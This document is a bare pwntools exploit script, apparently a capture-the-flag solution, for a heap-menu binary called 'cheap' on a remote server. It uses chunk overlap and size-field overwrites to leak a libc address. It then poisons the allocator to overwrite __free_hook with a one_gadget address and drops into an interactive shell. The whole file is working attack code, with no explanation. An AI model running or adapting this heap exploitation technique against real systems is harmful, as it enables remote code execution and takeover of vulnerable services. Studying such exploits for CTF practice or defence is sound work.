from pwn import *
#p=process('./cheap')
p=remote('34.146.101.4',30001)
elf = ELF('./cheap')
libc = ELF('libc.so.6')
#raw_input("DEBUG")

def create(size,data):
	p.sendlineafter("Choice: ","1")
	p.sendlineafter("size: ",str(size))
	p.sendlineafter("data: ",str(data))
	log.info("Create!")

def show():
	p.sendlineafter("Choice: ","2")
	log.info("Show!")

def delete():
	p.sendlineafter("Choice: ","3")
	log.info("Delete!")

'''
b*0x00005555555553fb
b*0x0000555555555443
b*0x0000555555555429
'''


create(0x80,"b"*0x80)
delete()
create(0x90,"c"*0x80)
delete()
create(0x3c0,"c"*0x80)
create(0x70,"a"*0x70)
create(0x80,"a"*0x88+p64(0x471))
create(0x90,"d"*10)

delete()
show()
leak = u64(p.recv(6)+"\x00"*2)
log.info("leak: "+hex(leak))
base = leak - 0x1ebbe0
log.info("Base: "+hex(base))
free_hook = base + libc.symbols['__free_hook']
log.info("__free_hook: "+hex(free_hook))
#0xe6c7e 0xe6c81 0xe6c84
one = base + 0xe6c81

create(0x418,"a")
create(0x80,"c"*0x80)
delete()
create(0x10,"a"*0x10)
delete()
create(0x28,"b"*0x20)
delete()
create(0x58,"d"*0x48)
create(0x10,"f"*0x18+p64(0x91))
delete()
create(0x28,"b"*0x20)
delete()
create(0x10,"f"*0x18+p64(0x91)+p64(free_hook))
create(0x80,"c"*0x80)
create(0x80,p64(one))
delete()

p.interactive()